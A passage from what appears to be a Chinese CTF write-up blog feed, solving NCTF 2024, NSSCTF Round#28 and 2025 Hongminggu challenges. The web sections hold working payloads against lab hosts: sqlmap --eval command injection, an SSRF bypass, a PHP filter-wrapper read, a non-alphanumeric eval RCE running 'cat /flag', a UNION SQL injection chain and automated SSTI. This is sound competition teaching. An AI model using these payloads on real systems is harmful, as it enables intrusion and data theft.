class="number">114514</span></span><br></pre></td></tr></table></figure><p>说实话，真不了解，不愧是<strong>sqlmap-master</strong></p><p>那既然如此，<code>-c</code>能把文件带出来，我们为什么不直接读环境变量呢<br><code>127.0.0.1 -c /proc/self/environ</code></p><p>诶，看了一下出题人的<a href="https://exp10it.io/2025/03/nctf-2024-web-writeup/">wp</a>，这道题很明显是有回显的啊，可以直接执行<code>env</code><br><code>127.0.0.1 --eval __import__(&#39;os&#39;).system(&#39;env&#39;)</code></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="QRcode-Reconstruction"><a href="#QRcode-Reconstruction" class="headerlink" title="QRcode Reconstruction"></a>QRcode Reconstruction</h2><p>经典二维码修复<br><img src="https://pic1.zhimg.com/80/v2-e3dce2dc4b1481a7641ed85532c6c157_1440w.png" alt=""><br>先自己涂上，然后把全部的纠错码擦掉<br><img src="https://pica.zhimg.com/80/v2-04ba7358595be0e373b888bf579b4a6a_1440w.png" alt=""><br>选择<br><img src="https://pica.zhimg.com/80/v2-d50339b7af09d24516fb9fb6847b5afc_1440w.png" alt=""><br>然后开始<strong>嗯猜flag</strong><br><img src="https://pica.zhimg.com/80/v2-7067f81c3451be3b59ff1c4c518d640a_1440w.png" alt=""><br><strong>NCTF{WeLc0mE_t0_Nctf_2024!!!}</strong><br>直接一把出</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign()"></a>Sign()</h2><blockquote><p>这是恢复互联网的密钥，密码是实时生成的三万个随机数。</p></blockquote><p>emmmmm，这密码真难看</p><p><a href="https://crystaljiang232.github.io/nctf2024/">一部分官方wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;放在最前面，&lt;a href=&quot;https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh&quot;&gt;laogong的wp&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF Round#28 &amp;&amp; 2025红明谷杯初赛 WriteUps</title>
    <link href="https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2025-03-22T08:57:18.000Z</published>
    <updated>2025-03-24T10:02:56.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-Round-28"><a href="#NSSCTF-Round-28" class="headerlink" title="NSSCTF Round#28"></a>NSSCTF Round#28</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag在/flag路由中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only http:// URLs are allowed&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_ips</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ip</span>, <span class="variable">$forbidden_ips</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Access to localhost or 127.0.0.1 is forbidden&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>)]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接绕过<strong>127.0.0.1</strong>的解析，<code>?url=http://0.0.0.0/flag</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0(缺省路由的写法也可以代表0.0.0.0) 0.0.0.0 都代表本地</span><br><span class="line">127.x.x.x 除了.1都行，都是环回地址</span><br></pre></td></tr></table></figure><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;password can&#x27;t be a number&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$password</span> != <span class="number">123456</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong password&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wonderful&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);   <span class="comment"># level2.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>%00</code>进行截断，强比较网上随便找例子或者<code>fastcoll</code>生成，<code>level2.php</code>源码不高亮，得通过<strong>伪协议</strong>读出来(那这里是不是可以直接读<code>flag</code>)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;php://filter/convert.base64-encode/resource=/var/www/html/level2.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/?password=123456%00&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># level2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿正则匹配的东西去搜，可以找到，参考<a href="https://exp10it.io/2022/10/2022-hnctf-web-writeup/#challenge__rce">原题</a>构造</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;<span class="string">&#x27;rce&#x27;</span>: <span class="string">&#x27;$_=([].¥)&#123;3&#125;;$_++;$_.=++$_;$_++;$_++;$_++; $_++;$_++;$_.=([].¥)&#123;2&#125;;$_=_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;);&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/level2.php?0=system&amp;1=cat /flag&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="light-pink"><a href="#light-pink" class="headerlink" title="light_pink"></a>light_pink</h3><p>试出了，用单引号进行闭合(字符型注入)，<code>order by</code>查询列数，发现数据库错误，那就试着把注释带上(这是个好习惯)，不可以用<code>-</code>，用<code>#</code>也不行，换<code>%23</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 5%23 查到列数为5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span><span class="operator">%</span><span class="number">23</span>    联合注入中需要id为不存在的数才能把<span class="keyword">union</span>查询的内容回显，得到nss_board</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like &#x27;</span>nss_board<span class="string">&#x27;%23   这里过滤了等号，用like绕过即可，得到Cute,messages</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(column_name),<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="keyword">like</span> <span class="string">&#x27;Cute&#x27;</span><span class="operator">%</span><span class="number">23</span>    得到id,Happy，另外一个是id,username,title,content,created_at</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(Happy),5 from Cute%23</span></span><br></pre></td></tr></table></figure><p>说实话<code>sqlmap</code>好像梭不出来()，还有人把数据库扫出来了</p><h3 id="Coding-Loving"><a href="#Coding-Loving" class="headerlink" title="Coding Loving"></a>Coding Loving</h3><p><strong>Code Audit</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span></span><br><span class="line">FILTER_KEYWORDS = [<span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span>]</span><br><span class="line">TIME_LIMIT = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_forbidden_keywords</span>(<span class="params">complaint</span>):</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> FILTER_KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.lower() <span class="keyword">in</span> complaint:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;coding&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, command=command)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (abc:=request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;试一试&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        css_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">        command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> contains_forbidden_keywords(command):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Loving Music&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="subst">&#123;css_url&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Loving coding&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p class=&quot;emoji&quot;&gt;🧑‍💻&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">&#123;command&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, command=command,css_url=css_url)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;shell.html&#x27;</span>, command=cmd)</span><br></pre></td></tr></table></figure><p>看见了<code>render_template_string</code>，那就打<code>SSTI</code>，说实话折腾了好久焚尽，就是不行，好奇怪</p><p>最后去<code>wsl</code>里面试试，发现成功了。。。。<code>webui</code>和黑名单(这个我没<strong>fuzz</strong>，拿的别人<code>wp</code>的)，都失败了，最后参考<a href="https://www.bx33661.com/archives/nssround-28--webfang-xiang-ti-jie#Coding-Loving">这篇</a>，<code>crack-request</code><br>这是<strong>windows</strong>的，有点逆天<br><img src="https://picx.zhimg.com/80/v2-20aabab13a61704916d0d120c78745cf_1440w.png" alt=""><br>这是我<strong>wsl</strong>刚<code>pip install fenjing</code>的<br><img src="https://picx.zhimg.com/80/v2-f539c7f490a7e25aced89710414b05f1_1440w.png" alt=""></p><p>自己抓的包</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">POST /test HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Referer: http://node6.anna.nssctf.cn:<span class="number">24482</span>/</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=<span class="number">1733148706</span>,<span class="number">1733212021</span>,<span class="number">1733212157</span>,<span class="number">1733420774</span>; session=eyJ1c2VyIjoidGVzdCJ9.Z-Elfw.u8hpIKgL8gXSzLW0ayQI4Y3KYjw</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">136.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">136.0</span></span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">11</span></span><br><span class="line"></span><br><span class="line">cmd=PAYLOAD</span><br></pre></td></tr></table></figure><p><code>python3 -m fenjing crack-request -f http.txt --host &quot;node6.anna.nssctf.cn&quot; --port 24482</code></p><h1 id="红明谷杯"><a href="#红明谷杯" class="headerlink" title="红明谷杯"></a>红明谷杯</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="异常行为溯源"><a href="#异常行为溯源" class="headerlink" title="异常行为溯源()"></a>异常行为溯源()</h3><p><strong>30万个流量包</strong>，数据解一次<code>base64</code>，还有提取中间的内容再解一次<code>base64</code>才能拿到<code>ip</code>，随便试了几个，不对，<code>python</code>脚本提的数据不太行，是时候补个<strong>流量分析工具</strong>了(bushi)，<code>NetA Pro</code>在整不知道用不用得上，试了一下没用，还是要靠脚本提</p><p>晚上找到了一篇<a href="https://nvme0n1p.dev/post/2025-hmg-wp">wp</a>，其他题目也可以参考</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from json import load</span></span><br><span class="line"><span class="keyword">from</span> pyshark <span class="keyword">import</span> FileCapture</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> FileCapture(input_file=<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\network_traffic.pcap&quot;</span>, keep_packets=<span class="literal">False</span>):</span><br><span class="line">        tcp = packet.tcp</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(tcp.payload.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)).decode()</span><br><span class="line">        data = b64decode(data).decode()</span><br><span class="line">        data = loads(data)</span><br><span class="line">        msg = data[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line">        <span class="built_in">type</span> = data[<span class="string">&quot;type&quot;</span>]</span><br><span class="line">        msg = b64decode(msg).decode().strip()</span><br><span class="line">        f.write(msg+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>好好好，原来脚本要这样写，载入流量包这一块就没经验了，如果<code>wireshark</code>安装不是默认路径，得<a href="https://blog.csdn.net/qq_42411587/article/details/119909870">参考修改</a></p><p>然后就是<strong>正则匹配</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">logs = <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>).readlines()</span><br><span class="line">log_match = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&#x27;(\d+\.\d+\.\d+\.\d+) ?- - \[(.*) \+\d+\] &quot;(\w+) ([\w\/.-]+) HTTP\/1\.1&quot; \d+ \d+ &quot;-&quot; &quot;.*&quot;&#x27;</span>)</span><br><span class="line">ip_maps = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">    m = log_match.<span class="keyword">match</span>(log)</span><br><span class="line">    ip = m.group(<span class="number">1</span>)</span><br><span class="line">    time = m.group(<span class="number">2</span>)</span><br><span class="line">    time = datetime.strptime(time, <span class="string">&quot;%d/%b/%Y:%H:%M:%S&quot;</span>)</span><br><span class="line">    method = m.group(<span class="number">3</span>)</span><br><span class="line">    url = m.group(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print(time_match.match(time).group())</span></span><br><span class="line">    ip_maps[ip] = ip_maps.get(ip, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line">ip_maps = <span class="built_in">sorted</span>(ip_maps.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> ip, count <span class="keyword">in</span> ip_maps:</span><br><span class="line">    <span class="built_in">print</span>(ip, count)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的仓库"><a href="#简单的仓库" class="headerlink" title="简单的仓库"></a>简单的仓库</h3><p>先注册，然后抓包充值接口<br><img src="https://picx.zhimg.com/80/v2-468ee1cb3d384d48548f50216a923796_1440w.png" alt=""><br>发现应该是目录读取，<code>hvang/readme.txt</code>这样，直接读根目录<br><img src="https://picx.zhimg.com/80/v2-6ef314597817ff95786d6b131f99d298_1440w.png" alt=""><br>想办法读文件，这时候发现我们还是<code>guest</code>，继续抓包改一下权限<br><img src="https://picx.zhimg.com/80/v2-2b615198930c6101c1a05e19cc02c8a5_1440w.png" alt=""><br>之后可以下载文件，找到下载路径，查看<code>/flag.sh</code>，找到<code>flag</code>文件位置<br><img src="https://picx.zhimg.com/80/v2-15f2a2c40b856b1ff65df32a149d5971_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-34fd1872100e1ae0a093d60d07a94dd9_1440w.png" alt=""></p><p>你这仓库<code>user</code>目录居然可以这样控制的，六百六十六啊</p><h3 id="日记本"><a href="#日记本" class="headerlink" title="日记本()"></a>日记本()</h3><p>还没来得及看，今天怎么一堆比赛啊QWQ，后面再找个<code>wp</code>补补</p><p>好吧，看了一下，不怎么好打</p><h2 id="Crypto-unsolved"><a href="#Crypto-unsolved" class="headerlink" title="Crypto(unsolved)"></a>Crypto(unsolved)</h2><h3 id="qaq"><a href="#qaq" class="headerlink" title="qaq"></a>qaq</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"></span><br><span class="line">res = [<span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272555731</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556223</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556437</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556749</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557237</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557459</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557687</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558627</span>, <span 